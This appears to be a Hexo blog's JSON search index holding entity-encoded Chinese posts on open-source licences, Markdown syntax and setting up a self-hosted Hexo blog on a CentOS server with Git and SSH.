&#x4FEE;&#x6539;&#x81EA;&#x7531;&#xFF1A;&#x5141;&#x8BB8;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x589E;&#x52A0;&#x6216;&#x5220;&#x9664;&#x8F6F;&#x4EF6;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x8F6F;&#x4EF6;&#x4FEE;&#x6539;&#x540E;&#x5FC5;&#x987B;&#x4F9D;&#x7136;&#x57FA;&#x4E8E;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x6388;&#x6743; BSD(Berkeley Software Distribution&#xFF0C;&#x4F2F;&#x514B;&#x5229;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x7248;)&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A; &#x7528;&#x6237;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x3001;&#x4FEE;&#x6539;&#x548C;&#x91CD;&#x65B0;&#x53D1;&#x5E03;&#x9075;&#x5FAA;&#x8BE5;&#x8BB8;&#x53EF;&#x7684;&#x8F6F;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5C06;&#x8F6F;&#x4EF6;&#x4F5C;&#x4E3A;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x548C;&#x9500;&#x552E;&#xFF0C;&#x524D;&#x63D0;&#x662F;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4E0B;&#x9762;3&#x4E2A;&#x6761;&#x4EF6;&#x3002; BSD&#xFF0C;&#x4F2F;&#x514B;&#x5229;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x7248; &#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x5305;&#x542B;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x5219;&#x6E90;&#x4EE3;&#x7801;&#x5FC5;&#x987B;&#x7EE7;&#x7EED;&#x9075;&#x5FAA;BSD&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002;&#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x53EA;&#x6709;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x5728;&#x76F8;&#x5173;&#x6587;&#x6863;&#x6216;&#x7248;&#x6743;&#x6587;&#x4EF6;&#x4E2D;&#x58F0;&#x660E;&#x539F;&#x59CB;&#x4EE3;&#x7801;&#x9075;&#x5FAA;&#x4E86;BSD&#x534F;&#x8BAE;&#x3002;&#x4E0D;&#x5141;&#x8BB8;&#x7528;&#x539F;&#x59CB;&#x8F6F;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#x3001;&#x4F5C;&#x8005;&#x540D;&#x5B57;&#x6216;&#x673A;&#x6784;&#x540D;&#x79F0;&#x8FDB;&#x884C;&#x5E02;&#x573A;&#x63A8;&#x5E7F;&#x3002; Apache &#x8BB8;&#x53EF;&#x8BC1;&#x7248;&#x672C;&#xFF08;Apache License Version&#xFF09;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A;&#x5728;&#x4E3A;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x63D0;&#x4F9B;&#x7248;&#x6743;&#x53CA;&#x4E13;&#x5229;&#x8BB8;&#x53EF;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x62E5;&#x6709;&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x53CA;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x81EA;&#x7531;&#x3002;&#x8BE5;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x9002;&#x7528;&#x4E8E;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#xFF0C;&#x73B0;&#x5728;&#x70ED;&#x95E8;&#x7684;Hadoop&#x3001;Apache HTTP Server&#x3001;MongoDB&#x7B49;&#x9879;&#x76EE;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x8BE5;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x7814;&#x53D1;&#x7684;&#xFF0C;&#x7A0B;&#x5E8F;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x5728;&#x5F00;&#x53D1;&#x9075;&#x5FAA;&#x8BE5;&#x534F;&#x8BAE;&#x7684;&#x8F6F;&#x4EF6;&#x65F6;&#xFF0C;&#x8981;&#x4E25;&#x683C;&#x9075;&#x5B88;&#x4E0B;&#x9762;&#x7684;4&#x4E2A;&#x6761;&#x4EF6;&#x3002; Apache License &#x8BE5;&#x8F6F;&#x4EF6;&#x53CA;&#x5176;&#x884D;&#x751F;&#x54C1;&#x5FC5;&#x987B;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;Apache&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002;&#x5982;&#x679C;&#x4FEE;&#x6539;&#x4E86;&#x7A0B;&#x5E8F;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6587;&#x6863;&#x4E2D;&#x8FDB;&#x884C;&#x58F0;&#x660E;&#x3002;&#x82E5;&#x8F6F;&#x4EF6;&#x662F;&#x57FA;&#x4E8E;&#x4ED6;&#x4EBA;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x7F16;&#x5199;&#x800C;&#x6210;&#x7684;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x4FDD;&#x7559;&#x539F;&#x59CB;&#x4EE3;&#x7801;&#x7684;&#x534F;&#x8BAE;&#x3001;&#x5546;&#x6807;&#x3001;&#x4E13;&#x5229;&#x58F0;&#x660E;&#x53CA;&#x5176;&#x4ED6;&#x539F;&#x4F5C;&#x8005;&#x58F0;&#x660E;&#x7684;&#x5185;&#x5BB9;&#x4FE1;&#x606F;&#x3002;&#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x6709;&#x58F0;&#x660E;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x9700;&#x5728;&#x6B64;&#x6587;&#x4EF6;&#x4E2D;&#x6807;&#x6CE8;Apache&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x53CA;&#x5176;&#x4ED6;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002; MPL(Mozilla Public License&#xFF0C; Mozilla&#x516C;&#x5171;&#x8BB8;&#x53EF;)&#xFF1A; &#x76F8;&#x8F83;&#x4E8E;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF0C;MPL&#x66F4;&#x52A0;&#x6CE8;&#x91CD;&#x4E8E;&#x5BF9;&#x5F00;&#x53D1;&#x8005;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x9700;&#x6C42;&#x548C;&#x6536;&#x76CA;&#x4E4B;&#x95F4;&#x7684;&#x5E73;&#x8861; MIT&#xFF08;Massachusetts Institute of Technology )&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A; &#x76EE;&#x524D;&#x9650;&#x5236;&#x6700;&#x5C11;&#x7684;&#x5F00;&#x6E90;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x4E4B;&#x4E00;&#xFF0C;&#x53EA;&#x8981;&#x7A0B;&#x5E8F;&#x7684;&#x5F00;&#x53D1;&#x8005;&#x5728;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#x4FDD;&#x7559;&#x539F;&#x4F5C;&#x8005;&#x7684;&#x8BB8;&#x53EF;&#x4FE1;&#x606F;&#x5373;&#x53EF;&#xFF0C;&#x56E0;&#x6B64;&#x666E;&#x904D;&#x88AB;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x6240;&#x4F7F;&#x7528;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"},{"name":"开源","slug":"开源","permalink":"https://marnm.github.io/tags/开源/"}]},{"title":"Markdown 简明语法手册","date":"2018-07-10T12:28:22.000Z","path":"/posts/bff83912/","text":"Markdown &#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;Markdown 1. &#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;&#x4F7F;&#x7528; * &#x548C; ** &#x8868;&#x793A;&#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53; &#x793A;&#x4F8B;&#xFF1A; &#x8FD9;&#x662F; &#x659C;&#x4F53; &#xFF0C;&#x8FD9;&#x662F; &#x7C97;&#x4F53; &#x3002; 2. &#x5206;&#x7EA7;&#x6807;&#x9898;&#x4F7F;&#x7528; === &#x8868;&#x793A;&#x4E00;&#x7EA7;&#x6807;&#x9898;&#xFF0C; &#x4F7F;&#x7528; &#x2014; &#x8868;&#x793A;&#x4E8C;&#x7EA7;&#x6807;&#x9898;&#x3002; &#x793A;&#x4F8B;&#xFF1A; 12345&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E00;&#x7EA7;&#x6807;&#x9898;========================&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x7EA7;&#x6807;&#x9898;-------------------------### &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E09;&#x7EA7;&#x6807;&#x9898; &#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x5728;&#x884C;&#x9996;&#x52A0;#&#x53F7;&#x8868;&#x793A;&#x4E0D;&#x540C;&#x7EA7;&#x522B;&#x7684;&#x6807;&#x9898;&#xFF08;H1-H6&#xFF09;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;# H1,&#xFF0C;## H2&#xFF0C; ### H3&#xFF0C;#### H4&#x3002; 3. &#x8D85;&#x94FE;&#x63A5;&#x4F7F;&#x7528;[&#x63CF;&#x8FF0;](&#x94FE;&#x63A5;&#x5730;&#x5740;)&#x4E3A;&#x6587;&#x5B57;&#x589E;&#x52A0;&#x8D85;&#x94FE;&#x63A5; &#x793A;&#x4F8B;&#xFF1A; &#x8FD9;&#x662F;&#x53BB;&#x73A9;&#x672C;&#x4EBA;&#x535A;&#x5BA2;&#x7684;&#x8FDE;&#x63A5; 4. &#x65E0;&#x5E8F;&#x5217;&#x8868;&#x4F7F;&#x7528; *&#xFF0C;+&#xFF0C;- &#x8868;&#x793A;&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x3002; &#x793A;&#x4F8B; &#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E00; &#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E8C; &#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E09; 5. &#x6709;&#x5E8F;&#x5217;&#x8868;&#x4F7F;&#x7528;&#x6570;&#x5B57;&#x548C;&#x70B9;&#x8868;&#x793A;&#x6709;&#x5E8F;&#x5217;&#x8868; &#x793A;&#x4F8B;&#xFF1A; &#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E00; &#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E8C; &#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E09; 6. &#x6587;&#x5B57;&#x5F15;&#x7528;&#x4F7F;&#x7528; &gt; &#x8868;&#x793A;&#x6587;&#x5B57;&#x5F15;&#x7528; &#x793A;&#x4F8B;&#xFF1A; &#x541B;&#x4E0D;&#x89C1;&#xFF0C;&#x9EC4;&#x6CB3;&#x4E4B;&#x6C34;&#x5929;&#x4E0A;&#x6765;&#xFF0C;&#x5954;&#x6D41;&#x5230;&#x6D77;&#x4E0D;&#x590D;&#x56DE;&#x3002; &#x5929;&#x751F;&#x6211;&#x6750;&#x5FC5;&#x6709;&#x7528;&#xFF0C;&#x5343;&#x91D1;&#x6563;&#x5C3D;&#x8FD8;&#x590D;&#x6765;&#x3002; 7. &#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;&#x4F7F;&#x7528; `&#x4EE3;&#x7801;` &#x8868;&#x793A;&#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757; &#x793A;&#x4F8B;&#xFF1A; &#x8BA9;&#x6211;&#x4EEC;&#x804A;&#x804A;Python 8. &#x4EE3;&#x7801;&#x5757;&#x4F7F;&#x7528; &#x56DB;&#x4E2A;&#x7F29;&#x8FDB;&#x7A7A;&#x683C; &#xFF08;&#x6216;&#x8005;&#x4E00;&#x4E2A;Tab&#x952E;&#xFF09;&#x8868;&#x793A;&#x4EE3;&#x7801;&#x5757; &#x793A;&#x4F8B;&#xFF1A; 12345public class HelloWorld{ public static void mian(String[] args){ System.out.println(&quot;Hello World!&quot;); }} 9. &#x63D2;&#x5165;&#x56FE;&#x50CF;&#x4F7F;&#x7528; ![&#x63CF;&#x8FF0;](&#x56FE;&#x7247;&#x94FE;&#x63A5;&#x5730;&#x5740;) &#x63D2;&#x5165;&#x56FE;&#x50CF; &#x793A;&#x4F8B;&#xFF1A; &#x6211;&#x7684;&#x5934;&#x50CF; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"标记语言","slug":"标记语言","permalink":"https://marnm.github.io/tags/标记语言/"}]},{"title":"Markdown语法说明（快速入门）","date":"2018-07-05T09:15:52.000Z","path":"/posts/5125c787/","text":"Markdown&#x8BED;&#x6CD5;&#x7B80;&#x5355;&#x8BF4;&#x4E0B;&#x4E00;&#x4E9B;Markdown&#x7684;&#x8BED;&#x6CD5;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x66F4;&#x52A0;&#x719F;&#x6089;&#x7684;&#x4F7F;&#x7528;Markdown&#x7F16;&#x5199;&#x6587;&#x7AE0;&#x4E86;&#x3002; &#x6807;&#x9898;# h1&#x7EA7;&#x6807;&#x9898; ## h2&#x7EA7;&#x6807;&#x9898; ### h3&#x7EA7;&#x6807;&#x9898; #### h4&#x7EA7;&#x6807;&#x9898; ##### h5&#x7EA7;&#x6807;&#x9898; &#x5217;&#x8868;#&#x6709;&#x5E8F;&#x5217;&#x8868; 1.&#x5217;&#x8868;1 2.&#x5217;&#x8868;2 3.&#x5217;&#x8868;3 #&#x65E0;&#x5E8F;&#x5217;&#x8868;:&#x4F7F;&#x7528; - &#x52A0;&#x4E00;&#x4E2A;&#x7A7A;&#x683C; -&#x5217;&#x8868;&#x4E00; -&#x5217;&#x8868;&#x4E8C; -&#x5217;&#x8868;&#x4E09; &#x6709;&#x5E8F;&#x5217;&#x8868;&#x6548;&#x679C; &#x5217;&#x8868;1 &#x5217;&#x8868;2 &#x7C7B;&#x8868;3 &#x65E0;&#x5E8F;&#x5217;&#x8868;&#x6548;&#x679C; &#x5217;&#x8868;&#x4E00; &#x5217;&#x8868;&#x4E8C; &#x5217;&#x8868;&#x4E09; &#x5F3A;&#x8C03;*&#x659C;&#x4F53;* **&#x7C97;&#x4F53;** &#x659C;&#x4F53;&#x7C97;&#x4F53; &#x8D85;&#x94FE;&#x63A5;[&#x6211;&#x7684;&#x535A;&#x5BA2;](https://marnm.github.io/) &#x6211;&#x7684;&#x535A;&#x5BA2; &#x5F15;&#x7528;&gt; &#x8FD9;&#x662F;&#x5F15;&#x7528;&#x7684;&#x6587;&#x5B57; &gt; &#x5F15;&#x7528;&#x5185;&#x53EF;&#x4EE5;&#x5D4C;&#x5957;&#x6807;&#x9898;&#x3001;&#x6807;&#x9898;&#x5217;&#x8868;&#x7B49; &gt; ##### &#x6807;&#x9898; &gt; - &#x65E0;&#x5E8F;&#x5217;&#x8868; &gt; 1. &#x6709;&#x5E8F;&#x5217;&#x8868; &#x8FD9;&#x662F;&#x5F15;&#x7528;&#x7684;&#x6587;&#x5B57;&#x5F15;&#x7528;&#x5185;&#x53EF;&#x4EE5;&#x5D4C;&#x5957;&#x6807;&#x9898;&#x3001;&#x6807;&#x9898;&#x5217;&#x8868;&#x7B49; &#x6807;&#x9898; &#x65E0;&#x5E8F;&#x5217;&#x8868; &#x6709;&#x5E8F;&#x5217;&#x8868; &#x4EE3;&#x7801;public class HelloWorld { public static void main(String[] args){ System.out.println(&quot;Hello World!&quot;); } } &#x8868;&#x683C;Item | Value -------- | --- Computer | $1600 Phone | $12 Pipe | $1 &#x6548;&#x679C; Item Value Computer $1600 Phone $12 Pipe $1 &#x63D2;&#x5165;&#x56FE;&#x50CF;![&#x63CF;&#x8FF0;](URL) ![@&#x56FE;&#x7247;&#x5E95;&#x4E0B;&#x663E;&#x793A;&#x63CF;&#x8FF0; | center | 300x200](1.png) @&#x63D2;&#x5165;&#x56FE;&#x7247; | right | 300x200 &#x952E;&#x76D8;&#x952E;&lt;kbd&gt;Ctrl+C&lt;/kbd&gt; and &lt;kbd&gt;Ctrl+V&lt;/kbd&gt; Ctrl+C and Ctrl+V &#x6807;&#x8BB0;`&#x6807;&#x8BB0;` &#x6807;&#x8BB0; Markdown &#x6807;&#x8BB0;&#x8BED;&#x8A00; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"标记语言","slug":"标记语言","permalink":"https://marnm.github.io/tags/标记语言/"}]},{"title":"使用服务搭建Hexo个人博客","date":"2018-07-03T15:22:24.000Z","path":"/posts/b161a250/","text":"&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;Hexo&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x8BE6;&#x7EC6;&#x5728;&#x5B66;&#x4E60;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x88AB;&#x52A8;&#x63A5;&#x53D7;&#x77E5;&#x8BC6;&#x5BF9;&#x4F60;&#x7684;&#x63D0;&#x9AD8;&#x662F;&#x8F7B;&#x5FAE;&#x7684;&#xFF1B;&#x53EA;&#x6709;&#x4E3B;&#x52A8;&#x5B66;&#x4E60;&#xFF0C;&#x4E3B;&#x52A8;&#x601D;&#x8003;&#xFF0C;&#x624D;&#x80FD;&#x5B66;&#x4E60;&#x7684;&#x900F;&#x5F7B;&#xFF0C;&#x81F3;&#x5C11;&#x662F;&#x9AD8;&#x4E8E;&#x88AB;&#x52A8;&#x5B66;&#x4E60;&#x5427;&#x3002;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#xFF0C;&#x6700;&#x5927;&#x5316;&#x7684;&#x5229;&#x7528;&#x4F60;&#x6240;&#x5B66;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x68C0;&#x9A8C;&#x662F;&#x5426;&#x5B66;&#x4E60;&#x7684;&#x900F;&#x5F7B;&#x3002; &#x5F00;&#x59CB;&#x642D;&#x5EFA;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x8FD9;&#x91CC;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x914D;&#x7F6E;&#x662F;&#x672C;&#x5730;&#x673A;&#x5668;Win 10_x64&#x548C;&#x817E;&#x8BAF;&#x4E91;&#x670D;&#x52A1;&#x5668;CentOS 6.5_x64 &#x914D;&#x7F6E;&#x672C;&#x5730;&#x73AF;&#x5883;&#x5B89;&#x88C5;Node.js&#x548C;Git&#xFF0C;&#x5B89;&#x88C5;&#x65F6;&#x9ED8;&#x8BA4;&#x4E00;&#x76F4;&#x4E0B;&#x4E00;&#x6B65;&#x5C31;&#x597D;&#x3002; @Node.js | left | @Git | left | &#x8BBE;&#x7F6E;Git&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;git config &#x2013;list @git config --list | left | git config &#x2013;global user.name &#x201C;&#x7528;&#x6237;&#x540D;&#x201D;git config &#x2013;global user.email &#x201C;&#x90AE;&#x7BB1;&#x5730;&#x5740;&#x201D;&#x6216;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x540D;&#x548C;&#x90AE;&#x7BB1;git config &#x2013;global &#x2013;replace-all user.name &#x201C;&#x7528;&#x6237;&#x540D;&#x201D;git config &#x2013;global &#x2013;replace-all user.email &#x201C;&#x90AE;&#x7BB1;&#x5730;&#x5740;&#x201D; &#x5B89;&#x88C5;Hexonpm install -g hexo-cli @Hexo &#x914D;&#x7F6E;Hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;mkdir blog // &#x521B;&#x5EFA;&#x5B58;&#x653E;Hexo&#x7AD9;&#x70B9;&#x7684;&#x6587;&#x4EF6;&#x5939;hexo init blog // &#x751F;&#x6210;Hexo&#x7AD9;&#x70B9;hexo s &#x2013;debug // &#x7AD9;&#x70B9;&#x6D4B;&#x8BD5;, &#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x6253;&#x5F00;http://localhost:4000 @&#x751F;&#x6210;hexo&#x7AD9;&#x70B9; @&#x542F;&#x52A8;hexo &#x751F;&#x6210;SSH&#x5BC6;&#x94A5;&#x5728;&#x672C;&#x5730;&#x751F;&#x6210;&#x4E00;&#x5BF9;SSH&#x5BC6;&#x94A5;&#xFF0C;&#x7528;&#x4E8E;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;ssh-keygen -t rsa -C &#x201C;echo@qq.com&#x201C; #&#x7B2C;&#x4E00;&#x4E2A;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x4FDD;&#x5B58;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66;&#x3002; #&#x7B2C;&#x4E8C;&#x4E2A;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x5BC6;&#x94A5;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66; #&#x7B2C;&#x4E09;&#x4E2A;&#x786E;&#x8BA4;&#x521A;&#x8F93;&#x5165;&#x5BC6;&#x94A5;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF0C;&#x56DE;&#x8F66; @&#x751F;&#x6210;&#x5BC6;&#x94A5; &#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;&#x5B89;&#x88C5;Node.js#yum install -y nodejs &#x5B89;&#x88C5;Git&#x7531;&#x4E8E;Redhat Linux&#xFF0C;Oracle Linux&#xFF0C;CentOS&#xFF0C;Scientific Linux&#x7B49;yum&#x5E93;&#x7684;Git&#x7248;&#x672C;&#x592A;&#x4F4E;&#xFF0C;&#x8FD9;&#x91CC;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#xFF0C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x53BB;&#x4E0B;&#x8F7D;&#x6700;&#x65B0;&#x7248;&#x6E90;&#x7801;&#x5305;&#x7F16;&#x8BD1;&#x5B89;&#x8F6C;&#x3002;RHEL&#x548C;&#x884D;&#x751F;&#x4EA7;&#x54C1;&#x901A;&#x5E38;&#x90FD;&#x4F1A;&#x53D1;&#x5E03;&#x65E7;&#x7248;&#x672C;&#x7684;git&#x3002;&#x60A8;&#x53EF;&#x4EE5;&#x4ECE;&#x6E90;&#x4EE3;&#x7801;&#x4E0B;&#x8F7D;tarball&#x548C;&#x6784;&#x5EFA;&#xFF0C;&#x6216;&#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x5B58;&#x50A8;&#x5E93;&#xFF08;&#x5982;IUS&#x793E;&#x533A;&#x9879;&#x76EE;&#xFF09;&#x6765;&#x83B7;&#x53D6;&#x66F4;&#x65B0;&#x7248;&#x672C;&#x7684;git&#x3002; &#x9996;&#x5148;&#x5B89;&#x8F6C;Git&#x4F9D;&#x8D56;&#x5305; #yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel #yum install gcc perl-ExtUtils-MakeMaker #yum remove git // &#x5982;&#x679C;&#x4E4B;&#x524D;&#x6709;&#x5B89;&#x8F6C;&#x65E7;&#x7248;&#x672C;Git&#x5148;&#x5378;&#x8F7D; &#x4E0B;&#x8F7D;&#x89E3;&#x538B;Git&#x6E90;&#x7801;&#x5305;mkdir /usr/local/gitcd /usr/local/gitwget https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.9.5.tar.gztar -zxvf git-2.9.5.tar.gz &#x7F16;&#x8BD1;&#x5B89;&#x88C5;cd git-2.9.5make prefix=/usr/local/git allmake prefix=/usr/local/git installecho &#x201C;export PATH=$PATH:/usr/local/git/bin&#x201D; &gt;&gt; /etc/bashrc //#&#x6DFB;&#x52A0;&#x73AF;&#x5883;&#x53D8;&#x91CF;source /etc/bashrc ##&#x4F7F;&#x914D;&#x7F6E;&#x7ACB;&#x5373;&#x751F;&#x6548; &#x8BBE;&#x7F6E;Git&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84; #ln -s /usr/local/git/bin/git-upload-pack /usr/bin/git-upload-pack #ln -s /usr/local/git/bin/git-receive-pack /usr/bin/git-receive-pack &#x521B;&#x5EFA;git&#x7528;&#x6237;&#x7EC4;&#x548C;&#x7528;&#x6237;,&#x7528;&#x6765;&#x8FD0;&#x884C;Git&#x670D;&#x52A1; #groupadd git #useradd git -g git #passwd git &#x5207;&#x6362;&#x5230;git&#x7528;&#x6237; #su - git &#x8BBE;&#x7F6E;&#x7528;&#x6237;&#x6743;&#x9650; ##git&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;: #mkdir .ssh ##&#x65B0;&#x5EFA;&#x6587;&#x4EF6;&#x5939; #chmod 700 .ssh #touch .ssh/authorized_keys ##&#x65B0;&#x5EFA;&#x6587;&#x4EF6; #chmod 600 .ssh/authorized_keyscd /homechown -R git:git git&#x8BBE;&#x7F6E;git&#x6587;&#x4EF6;&#x5939;&#x6240;&#x6709;&#x8005;&#xFF0C;&#x53BB;&#x9664;&#x65E0;&#x5173;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650; &#x4FEE;&#x8EAB;ssh&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5F00;&#x542F;RSA&#x8BA4;&#x8BC1; #vi /etc/ssh/sshd_config #&#x627E;&#x5230;&#x5982;&#x4E0B;&#x4E09;&#x4E2A;&#x9009;&#x7EBF;&#xFF0C;&#x4FEE;&#x6539; 1.RSAAuthentication yes 2.PubkeyAuthentication yes 3.AuthorizedKeysFile home/git/.ssh/authorized_keys &#x4FDD;&#x5B58;:wq&#x56DE;&#x5230;&#x672C;&#x5730;&#x673A;&#x5668;&#xFF0C;&#x5C06;&#x521A;&#x624D;&#x751F;&#x6210;&#x7684;SSH&#x5BC6;&#x94A5;&#x5BFC;&#x51FA;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668; scp .ssh/id_rsa.pub root@192.168.1.2:/home/git/.ssh/authorized_keys&#x6211;&#x7684;win10&#x7CFB;&#x7EDF;&#x662F;&#x81EA;&#x5E26;&#x6709;scp&#x547D;&#x4EE4;&#x7684;&#xFF0C;win7&#x53EF;&#x80FD;&#x6CA1;&#x6709;&#xFF0C;&#x53EF;&#x4EE5;&#x6253;&#x5F00;git bash&#x547D;&#x4EE4;&#x884C;&#xFF0C;git&#x5DE5;&#x5177;&#x6709;&#xFF0C;&#x6216;&#x8005;&#x5B89;&#x88C5;putty&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;pscp &#x90E8;&#x7F72;hexo&#x535A;&#x5BA2; &#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;#cd /home/git #git init &#x2013;bare blog.git #chown -R git:git blog.git ##&#x6BCF;&#x751F;&#x6210;&#x4E00;&#x4E2A;git&#x4ED3;&#x5E93;&#x90FD;&#x8981;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x6743;&#x9650; &#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;git clone git@your-ip:/home/git/blog.git &#x2026;warning: You appear to have cloned an empty repository.&#x2026; &#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone&#x8FD9;&#x91CC;&#x6211;&#x76F4;&#x63A5;&#x4F7F;&#x7528;Apache&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4E3A;&#x522B;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;mkdir /var/www/hexo-blog git clone /home/git/blog.gig /var/www/htmlchown -R git:git /var/www/html &#x8BBE;&#x7F6E;Git Hook&#x4F7F;&#x7528;Git 